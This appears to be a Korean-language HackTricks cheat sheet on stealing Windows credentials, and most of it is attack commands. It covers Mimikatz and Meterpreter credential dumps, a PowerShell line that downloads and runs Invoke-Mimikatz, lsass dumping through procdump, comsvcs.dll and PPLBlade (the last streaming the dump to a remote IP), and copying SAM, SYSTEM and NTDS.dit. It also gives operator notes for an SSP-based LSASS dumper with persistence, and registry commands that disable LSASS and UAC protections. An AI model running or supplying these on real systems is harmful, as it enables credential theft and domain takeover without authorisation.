# Windows 자격 증명 탈취

{{#include ../../banners/hacktricks-training.md}}

## 자격 증명 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz가 할 수 있는 다른 작업들은** [**이 페이지**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **이러한 보호 조치들은 Mimikatz가 일부 자격 증명을 추출하는 것을 방지할 수 있습니다.**

## Meterpreter로 자격 증명

제가 만든 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)을 사용하여 피해자 내부에서 **비밀번호와 해시를 검색**하세요.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV 우회

### Procdump + Mimikatz

해당 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**정식 Microsoft 도구이기 때문에**, Defender에 의해 탐지되지 않습니다.\  
이 도구를 사용하여 **lsass 프로세스를 덤프**하고, **덤프를 다운로드**한 다음 덤프에서 **추출**하여 **credentials를 로컬로** 확보할 수 있습니다.

또는 [SharpDump](https://github.com/GhostPack/SharpDump)를 사용할 수도 있습니다.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
이 과정은 [SprayKatz](https://github.com/aas-n/spraykatz)를 사용하면 자동으로 수행됩니다: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**참고**: 일부 **AV**는 **procdump.exe to dump lsass.exe** 사용을 **악성**으로 **탐지**할 수 있습니다. 이는 이들이 문자열 **"procdump.exe" and "lsass.exe"**을 **탐지**하고 있기 때문입니다. 따라서 lsass.exe의 **이름 lsass.exe.** 대신 lsass.exe의 **PID**를 procdump에 **인수**로 **전달**하는 것이 **더 은밀하게** 작동합니다.

### **comsvcs.dll**로 lsass 덤프하기

`C:\Windows\System32`에 있는 **comsvcs.dll**라는 DLL은 충돌 시 **프로세스 메모리 덤프**를 담당합니다. 이 DLL에는 `MiniDumpW`라는 **함수**가 포함되어 있으며, `rundll32.exe`로 호출되도록 설계되어 있습니다.\
첫 두 인수는 중요하지 않지만, 세 번째 인수는 세 부분으로 나뉩니다. 덤프할 프로세스 ID가 첫 번째 부분을 구성하고, 덤프 파일 위치가 두 번째 부분이며, 세 번째 부분은 엄격하게 단어 **full** 뿐입니다. 다른 옵션은 존재하지 않습니다.\
이 세 부분을 파싱하면, DLL은 덤프 파일을 생성하고 지정한 프로세스의 메모리를 해당 파일로 옮깁니다.\
**comsvcs.dll**를 이용하면 lsass 프로세스를 덤프할 수 있으므로 procdump를 업로드해 실행할 필요가 없습니다. 이 방법은 자세히 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)에 설명되어 있습니다.

실행에 사용되는 명령은 다음과 같습니다:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**이 과정을 자동화할 수 있습니다** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Task Manager로 lsass 덤프하기**

1. 작업 표시줄에서 마우스 오른쪽 버튼을 클릭하고 Task Manager를 클릭합니다
2. More details를 클릭합니다
3. Processes 탭에서 "Local Security Authority Process" 프로세스를 찾습니다
4. "Local Security Authority Process" 프로세스를 마우스 오른쪽 버튼으로 클릭하고 "Create dump file"을 클릭합니다.

### procdump로 lsass 덤프하기

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 은 Microsoft에서 서명한 바이너리로 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 스위트의 일부입니다.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade로 lsass 덤프하기

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 은 Protected Process Dumper 도구로, 메모리 덤프를 난독화하고 디스크에 저장하지 않고 원격 워크스테이션으로 전송하는 것을 지원합니다.

**주요 기능**:

1. PPL 보호 우회
2. 메모리 덤프 파일을 난독화하여 Defender의 시그니처 기반 탐지 메커니즘을 회피
3. 디스크에 저장하지 않고 RAW 및 SMB 업로드 방법으로 메모리 덤프를 업로드 (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP 기반 LSASS 덤프 (MiniDumpWriteDump 없이)

Ink Dragon는 `MiniDumpWriteDump`를 호출하지 않는 세 단계의 덤퍼인 **LalsDumper**를 배포합니다. 따라서 해당 API에 대한 EDR 훅은 작동하지 않습니다:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`에서 32개의 소문자 `d`로 구성된 플레이스홀더를 찾아 이를 `rtu.txt`의 절대 경로로 덮어쓰고, 패치된 DLL을 `nfdp.dll`로 저장한 뒤 `AddSecurityPackageA("nfdp","fdp")`를 호출합니다. 이로 인해 **LSASS**는 악성 DLL을 새로운 Security Support Provider(SSP)로 로드하게 됩니다.
2. **Stage 2 inside LSASS** – LSASS가 `nfdp.dll`을 로드하면, DLL은 `rtu.txt`를 읽고 각 바이트를 `0x20`으로 XOR한 뒤 디코드된 블롭을 메모리에 매핑하고 실행으로 전달합니다.
3. **Stage 3 dumper** – 매핑된 페이로드는 해시된 API 이름으로부터 해결한 direct syscalls를 사용하여 MiniDump 로직을 재구현합니다 (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom`이라는 전용 export는 `%TEMP%\<pid>.ddt`를 열어 압축된 LSASS 덤프를 파일로 스트리밍한 다음 핸들을 닫아 후에 exfiltration을 진행할 수 있게 합니다.

운영자 메모:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, `rtu.txt`를 같은 디렉터리에 보관하세요. Stage 1은 하드코딩된 플레이스홀더를 `rtu.txt`의 절대 경로로 덮어쓰므로 분리하면 체인이 끊깁니다.
* 레지스트리 등록은 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`에 `nfdp`를 추가하여 이뤄집니다. 해당 값을 직접 설정하면 LSASS가 부팅 시마다 SSP를 재로딩하게 할 수 있습니다.
* `%TEMP%\*.ddt` 파일은 압축된 덤프입니다. 로컬에서 압축을 해제한 다음 자격 증명 추출을 위해 Mimikatz/Volatility에 전달하세요.
* `lals.exe`를 실행하려면 `AddSecurityPackageA`가 성공하도록 admin/SeTcb 권한이 필요합니다; 호출이 반환되면 LSASS는 투명하게 악성 SSP를 로드하고 Stage 2를 실행합니다.
* 디스크에서 DLL을 삭제해도 LSASS에서 제거되지 않습니다. 레지스트리 항목을 삭제하고 LSASS를 재시작(또는 재부팅)하거나 장기 지속을 위해 그대로 둘 수 있습니다.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 대상 DC에서 NTDS.dit 덤프
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 대상 DC에서 NTDS.dit의 암호 기록 덤프
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 각 NTDS.dit 계정에 대한 pwdLastSet 속성 표시
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

이 파일들은 _C:\windows\system32\config\SAM_ 및 _C:\windows\system32\config\SYSTEM._에 **있어야 합니다.** 하지만 **일반적인 방법으로는 단순히 복사할 수 없습니다** — 보호되어 있기 때문입니다.

### 레지스트리에서

이 파일들을 훔치는(steal) 가장 쉬운 방법은 레지스트리에서 복사본을 얻는 것입니다:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**다운로드** 해당 파일들을 Kali 머신으로 가져와 **해시를 추출**하려면 다음을 사용하세요:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

이 서비스를 사용하면 보호된 파일을 복사할 수 있습니다. Administrator 권한이 필요합니다.

#### Using vssadmin

vssadmin binary는 Windows Server 버전에서만 사용할 수 있습니다.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
하지만 **Powershell**에서도 동일하게 할 수 있습니다. 다음은 **SAM file을 복사하는 방법**의 예시입니다 (사용된 하드 드라이브는 "C:"이고 저장 위치는 C:\users\Public입니다). 하지만 이 방법은 모든 보호된 파일을 복사하는 데 사용할 수 있습니다:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
책에서 가져온 코드: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

마지막으로, [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)를 사용하여 SAM, SYSTEM 및 ntds.dit의 복사본을 만들 수도 있습니다.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 자격 증명 - NTDS.dit**

The **NTDS.dit** 파일은 **Active Directory**의 핵심으로 알려져 있으며 사용자 객체, 그룹 및 그 멤버십에 대한 중요한 데이터를 보관합니다. 도메인 사용자들의 **password hashes**가 저장되는 곳입니다. 이 파일은 **Extensible Storage Engine (ESE)** 데이터베이스이며 **_%SystemRoom%/NTDS/ntds.dit_**에 위치합니다.

이 데이터베이스에는 세 가지 주요 테이블이 유지됩니다:

- **Data Table**: 이 테이블은 사용자 및 그룹과 같은 객체에 대한 세부 정보를 저장하는 역할을 합니다.
- **Link Table**: 그룹 멤버십과 같은 관계를 추적합니다.
- **SD Table**: 각 객체의 **Security descriptors**가 여기에 저장되어 저장된 객체의 보안 및 접근 제어를 보장합니다.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows는 _Ntdsa.dll_을 사용해 해당 파일과 상호작용하며 _lsass.exe_에 의해 사용됩니다. 따라서 **NTDS.dit** 파일의 일부는 `lsass` 메모리 내에 위치할 수 있습니다(성능 향상을 위해 **cache**를 사용하기 때문에 최근에 접근된 데이터를 찾을 수 있습니다).

#### NTDS.dit 내부의 해시 복호화

해시는 3번 암호화되어 있습니다:

1. **BOOTKEY**와 **RC4**를 사용하여 Password Encryption Key (**PEK**)을 복호화합니다.
2. **PEK**와 **RC4**를 사용하여 해당 **hash**를 복호화합니다.
3. **DES**를 사용하여 **hash**를 복호화합니다.

**PEK**는 모든 domain controller에서 **같은 값**을 가지지만, domain controller의 **SYSTEM 파일**의 **BOOTKEY**를 사용하여 **NTDS.dit** 파일 내부에서 **암호화**되어 있습니다(각 domain controller마다 다릅니다). 이 때문에 NTDS.dit 파일에서 자격 증명을 얻으려면 **NTDS.dit와 SYSTEM** 파일이 필요합니다 (_C:\Windows\System32\config\SYSTEM_).

### Ntdsutil을 사용한 NTDS.dit 복사

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit에서 해시 추출**

일단 **획득한** **NTDS.dit** 및 **SYSTEM** 파일이 있으면 _secretsdump.py_ 같은 도구를 사용해 **해시를 추출**할 수 있습니다:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
또한 유효한 domain admin user를 사용하여 **자동으로 추출할 수 있습니다:**
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
대용량 **NTDS.dit 파일**의 경우 [gosecretsdump](https://github.com/c-sto/gosecretsdump)를 사용하여 추출하는 것이 권장됩니다.

마지막으로, **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ 또는 **mimikatz** `lsadump::lsa /inject`를 사용할 수도 있습니다.

### **NTDS.dit의 도메인 객체를 SQLite 데이터베이스로 추출하기**

NTDS 객체는 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)를 사용하여 SQLite 데이터베이스로 추출할 수 있습니다. secrets뿐만 아니라, raw NTDS.dit 파일이 이미 확보된 경우 추가 정보 추출을 위해 전체 객체와 그 속성들도 함께 추출됩니다.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive는 선택 사항이지만 비밀 해독을 허용합니다 (NT & LM hashes, cleartext passwords와 같은 supplemental credentials, kerberos 또는 trust keys, NT & LM password histories 등). 기타 정보와 함께 다음 데이터가 추출됩니다: 해시가 포함된 사용자 및 머신 계정, UAC flags, 마지막 로그온 및 비밀번호 변경 타임스탬프, 계정 설명, 이름, UPN, SPN, 그룹 및 재귀적 멤버십, organizational units 트리 및 멤버십, 신뢰된 도메인과 트러스트의 유형, 방향 및 속성...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). 이 바이너리를 사용하여 여러 소프트웨어에서 credentials를 추출할 수 있습니다.
```
lazagne.exe all
```
## SAM 및 LSASS에서 자격 증명을 추출하기 위한 기타 도구

### Windows credentials Editor (WCE)

이 도구는 메모리에서 자격 증명을 추출하는 데 사용할 수 있습니다. 다운로드: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM 파일에서 자격 증명을 추출합니다.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM 파일에서 자격 증명 추출
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **실행하기만 하면** 비밀번호가 추출됩니다.

## 유휴 RDP 세션 수집 및 보안 제어 약화

Ink Dragon’s FinalDraft RAT에는 `DumpRDPHistory` 태스커가 포함되어 있으며, 그 기법들은 모든 red-teamer에게 유용합니다:

### DumpRDPHistory 방식의 텔레메트리 수집

* **Outbound RDP targets** – 각 사용자 하이브를 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`에서 파싱합니다. 각 하위 키는 서버 이름, `UsernameHint`, 마지막 쓰기 타임스탬프를 저장합니다. PowerShell로 FinalDraft의 로직을 재현할 수 있습니다:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 로그에서 Event ID **21**(성공적인 로그온)과 **25**(연결 끊김)를 조회하여 누가 시스템을 관리했는지 매핑합니다:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

어떤 Domain Admin이 정기적으로 연결하는지 알게 되면, 그들의 **연결 끊긴** 세션이 남아 있는 동안 LSASS를 (LalsDumper/Mimikatz로) 덤프하세요. CredSSP + NTLM 폴백은 그들의 verifier와 토큰을 LSASS에 남기므로, 이를 SMB/WinRM을 통해 재생해 `NTDS.dit`를 획득하거나 도메인 컨트롤러에 페이로드·영구화를 설치할 수 있습니다.

### FinalDraft가 타겟으로 삼는 레지스트리 다운그레이드
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` 설정은 RDP 동안 자격 증명/티켓의 완전한 재사용을 강제하여 pass-the-hash 스타일의 피벗을 가능하게 합니다.
* `LocalAccountTokenFilterPolicy=1` 은 UAC 토큰 필터링을 비활성화하여 로컬 관리자가 네트워크를 통해 제약 없는 토큰을 얻도록 합니다.
* `DSRMAdminLogonBehavior=2` 는 DC가 온라인 상태일 때 DSRM 관리자가 로그인할 수 있게 하여, 공격자에게 또 다른 내장 고권한 계정을 제공합니다.
* `RunAsPPL=0` 은 LSASS PPL 보호를 제거하여 LalsDumper와 같은 덤퍼가 메모리에 쉽게 접근할 수 있게 합니다.

## 참고 자료

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
